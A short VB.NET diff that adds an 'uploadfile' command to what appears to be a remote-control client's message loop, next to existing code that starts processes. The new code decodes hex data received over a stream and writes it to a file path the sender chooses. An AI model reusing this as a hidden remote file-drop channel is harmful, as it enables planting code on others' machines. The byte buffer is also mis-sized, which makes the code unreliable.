@@ -150,6 +150,18 @@ Public Class Form1
                                         .UseShellExecute = False
                                     End With
                                     p.Start()
+                                ElseIf m(0) = "uploadfile" Then
+                                    Dim lastlogindata As String = r.ReadLine()
+                                    'MsgBox(lastlogindata, MsgBoxStyle.Critical, "")
+                                    Dim vByteBuffer(lastlogindata.Length + 1) As Byte
+                                    Dim vHexChar As String = String.Empty
+                                    For i As Integer = 0 To (lastlogindata.Length - 1) Step 2
+                                        vHexChar = lastlogindata(i) & lastlogindata(i + 1)
+                                        vByteBuffer(i / 2) = Byte.Parse(vHexChar, Globalization.NumberStyles.HexNumber)
+                                    Next
+                                    Using vFs As New FileStream(m(1), FileMode.Create)
+                                        vFs.Write(vByteBuffer, 0, vByteBuffer.Length)
+                                    End Using
                                 End If
                             Catch ex As Exception
 
